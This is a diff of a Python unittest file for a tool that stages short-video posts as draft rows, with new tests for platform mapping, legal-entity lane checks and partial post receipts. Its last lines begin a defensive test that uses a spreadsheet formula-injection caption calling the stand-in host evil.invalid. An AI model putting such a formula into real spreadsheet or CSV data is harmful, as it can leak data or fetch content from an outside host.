@@ -23,11 +23,11 @@ class BridgeTests(unittest.TestCase):
         with sqlite3.connect(self.db) as con:
             con.execute("""CREATE TABLE short_jobs(
                 job_id TEXT,status TEXT,rights_status TEXT,output_path TEXT,transform_path TEXT,
-                reviewed_at TEXT,hook TEXT,commentary TEXT,target_platforms TEXT)""")
+                reviewed_at TEXT,hook TEXT,commentary TEXT,target_platforms TEXT,lane TEXT)""")
             con.execute("CREATE TABLE short_posts(job_id TEXT,platform TEXT)")
-            con.execute("INSERT INTO short_jobs VALUES(?,?,?,?,?,?,?,?,?)", (
+            con.execute("INSERT INTO short_jobs VALUES(?,?,?,?,?,?,?,?,?,?)", (
                 "my_job_12", "APPROVED_FOR_PUBLISH_QUEUE", "owned", str(self.video),
-                "", "2026-10-22T08:00:00Z", "Our original HEMA video", "", "youtube_shorts"
+                "", "2026-10-22T08:00:00Z", "Our original HEMA video", "", "youtube_shorts", ""
             ))
         self.item = {
             "job_id": "my_job_12", "platform": "youtube_shorts",
@@ -44,7 +44,10 @@ class BridgeTests(unittest.TestCase):
         self.assertEqual(r["Job_ID"], "SF-my_job_12:youtube_shorts")
         self.assertEqual(r["Status"], "DRAFT")
         self.assertEqual(r["Visibility"], "private")
-        self.assertEqual(r["Entity"], "DRUZINA_ZS")
+        self.assertEqual(r["Entity"], "Družina Moravy z.s.")
+        self.assertEqual(r["Channel"], "youtube")
+        self.assertEqual(r["Event_ID"], "MEDIA:SHORTFACTORY:my_job_12")
+        self.assertIn("OWNER_REVIEW_REQUIRED", r["Error"])
         for field in ("Duplicate_Checked", "Rights_OK", "Approved_At", "Media_URL",
                       "Video_Drive_ID", "Post_URL", "Post_ID", "Scheduled_At", "Made_For_Kids"):
             self.assertFalse(r[field], field)
@@ -69,6 +72,52 @@ class BridgeTests(unittest.TestCase):
             b.write(rows, dest)
         with dest.open(encoding="utf-8-sig", newline="") as f:
             self.assertEqual(list(csv.DictReader(f))[0]["Status"], "DRAFT")
+
+    def test_all_platforms_map_explicitly_without_accidental_reels_posting(self):
+        for original, staged in [
+            ("youtube_shorts", "youtube"),
+            ("tiktok", "tiktok"),
+            ("instagram_reels", "instagram_reels"),
+            ("facebook_reels", "facebook_reels"),
+        ]:
+            with self.subTest(platform=original):
+                with sqlite3.connect(self.db) as con:
+                    con.execute("UPDATE short_jobs SET target_platforms=? WHERE job_id=?",
+                                (original, "my_job_12"))
+                row = b.stage({"items": [dict(self.item, platform=original)]},
+                              "OSVC", self.db)[0]
+                self.assertEqual(row["Channel"], staged)
+                self.assertEqual(row["Status"], "DRAFT")
+                self.assertEqual(row["Event_ID"], "MEDIA:SHORTFACTORY:my_job_12")
+                self.assertEqual(row["Entity"], "OSVC")
+                self.assertFalse(row["Video_Drive_ID"])
+                self.assertFalse(row["Rights_OK"])
+                self.assertFalse(row["Duplicate_Checked"])
+                if original.endswith("_reels"):
+                    self.assertIn("BLOCKED_NO_APPROVED_", row["Error"])
+
+    def test_canonical_lane_rejects_mixed_legal_entities(self):
+        with sqlite3.connect(self.db) as con:
+            con.execute("UPDATE short_jobs SET lane=? WHERE job_id=?", ("Druzina", "my_job_12"))
+        with self.assertRaisesRegex(ValueError, "legal entity conflict"):
+            b.stage({"items": [self.item]}, "OSVC", self.db)
+        self.assertEqual(b.stage({"items": [self.item]}, "DRUZINA_ZS", self.db)[0]["Entity"],
+                         "Družina Moravy z.s.")
+        with self.assertRaisesRegex(ValueError, "manifest lane mismatches"):
+            b.stage({"items": [dict(self.item, lane="OSVC")]}, "DRUZINA_ZS", self.db)
+        with sqlite3.connect(self.db) as con:
+            con.execute("UPDATE short_jobs SET lane=? WHERE job_id=?", ("OSVC", "my_job_12"))
+        with self.assertRaisesRegex(ValueError, "legal entity conflict"):
+            b.stage({"items": [self.item]}, "DRUZINA_ZS", self.db)
+
+    def test_partial_unverified_receipt_does_not_block_other_unposted_target(self):
+        with sqlite3.connect(self.db) as con:
+            con.execute("UPDATE short_jobs SET status=?,target_platforms=? WHERE job_id=?",
+                        ("RECEIPT_RECORDED_PARTIAL", "youtube_shorts,instagram_reels", "my_job_12"))
+            con.execute("INSERT INTO short_posts VALUES (?,?)", ("my_job_12", "instagram_reels"))
+        self.assertEqual(b.stage({"items": [self.item]}, "OSVC", self.db)[0]["Channel"], "youtube")
+        with self.assertRaisesRegex(ValueError, "receipt already exists"):
+            b.stage({"items": [dict(self.item, platform="instagram_reels")]}, "OSVC", self.db)
 
     def test_caption_formula_injection_blocked(self):
         obj = dict(self.item, caption='=IMPORTXML("https://evil.invalid","/")')
